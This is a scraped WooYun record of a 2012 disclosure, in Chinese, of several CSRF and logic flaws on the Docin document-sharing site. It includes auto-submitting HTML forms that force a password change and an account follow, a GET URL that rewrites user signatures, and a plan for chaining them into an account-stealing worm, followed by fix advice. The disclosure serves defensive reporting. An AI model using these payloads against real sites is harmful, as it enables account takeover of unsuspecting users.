{"id": 18464, "wybug_id": "wooyun-2012-08789", "wybug_title": "豆丁网N处CSRF漏洞", "wybug_corp": "豆丁网", "wybug_author": "imlonghao", "wybug_date": "2012-06-26 11:50", "wybug_open_date": "2012-08-10 11:51", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大", "逻辑错误", "设计不当", "利用技巧", "漏洞利用", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-08-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： N处CSRF漏洞，不多解释，RK20你懂的 详细说明：  【漏洞一】某天，对豆丁网的修改密码的设计进行了一下分析。修改密码需要输入3个内容，一个旧密码，一个新密码，一个新密码确认。确定需要三个框都是绿色钩钩，其中，旧密码的验证也存在缺陷。通过判断http://www.docin.com/app/my/docin/checkOldPwd?password=XXXXXXXXXXX返回的结果来判断用户输入的密码是否为真，ture和false，这个过程存在一定缺陷，在拿到用户COOKIES的情况下，利用穷举或者密码库，很容易就可以测试出用户的原密码。=========华丽的分割线=========【漏洞二】在修改密码POST的表单中，POST了三个参数，分别是oldPwd、newPwd、newPwdAgain但是，在我的测试当中，删掉oldPwd和newPwdAgain参数，只保留newPwd并进行POST操作，依然可以修改用户的密码，这就导致了可能会在获得了用户COOKIES的情况下，在未知旧密码的情况下强制修改用户的密码。=========华丽的分割线=========【漏洞三】修改密码的接口http://www.docin.com/app/my/docin/password?fn=update ，未验证POST表单的来路，结合漏洞二，在豆丁中传播一个带有以下代码的地址，就可以实现任意修改用户密码。\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://www.docin.com/app/my/docin/password?fn=update\" method=\"post\"><input type=\"text\" name=\"newPwd\" value=\"XXXXXXXXXXX\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n=========华丽的分割线=========【漏洞四】想了想，只是修改用户的密码，但不知道用户的帐号，要利用也只能达到盗取指定用户的帐号的目的，并不能广泛的进行蠕虫传播。于是，我想到了可以用CSRF操作被害用户的帐号关注一个人气小的帐号，那么就可以知道用户的帐号了。很荣幸，关注接口也没有做来源检查。接口地址：http://www.docin.com/app/my/docin/addConcernUser\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://www.docin.com/app/my/docin/addConcernUser\" method=\"post\"><input type=\"text\" name=\"fansUserId\" value=\"XXX\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n=========华丽的分割线=========【漏洞五】想要达到传播蠕虫的目的，还需要一个类似于发微博的东西，于是，我想到了修改用户签名的做法。很很很荣幸，也没有检查来源。利用方式：\nhttp://www.docin.com/jsp_cn/userBlog/userdoc/updateaboutme.jsp?content=[在这里输入你想修改的签名]\n=========华丽的分割线=========华丽丽的，一个盗号蠕虫就这样制成了。   漏洞证明：  【漏洞一】\n\n\n\n=========华丽的分割线=========【漏洞二】【漏洞三】\n\n=========华丽的分割线=========【漏洞四】随便找了一个人\n\n=========华丽的分割线=========【漏洞五】原签名\n\n接口返回信息\n\n修改后\n\n   修复方案：  漏洞一：取消这个验证，将旧密码的验证转入到按确定提交后POST到服务器后在验证漏洞二：严格验证POST的参数是否齐全漏洞三：严格验证POST表单来源漏洞四：同上漏洞五：同上   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-06-27 11:16 |    \t\tpfdz \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:13        | Stay hungry. Stay foolish.)\t\t \n  csrf帝……    \n     2012-07-05 10:44 |    \t\t豆丁网(乌云厂商)\t\t \n  已解决，谢谢    \n     2012-07-05 10:53 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @豆丁网 你能看到内容么。。。    \n     2012-07-05 11:31 |    \t\t豆丁网(乌云厂商)\t\t \n  看不到，怎么确认?    \n     2012-07-05 11:32 |    \t\t豆丁网(乌云厂商)\t\t \n  @imlonghao 看不到，怎么确认？    \n     2012-07-05 11:39 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @豆丁网 @xsser 我只是纠结这个漏洞的认领状态。。。    \n     2012-07-05 13:10 |    \t\t豆丁网(乌云厂商)\t\t \n  @imlonghao 已注册过了，认领时还让注册？    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}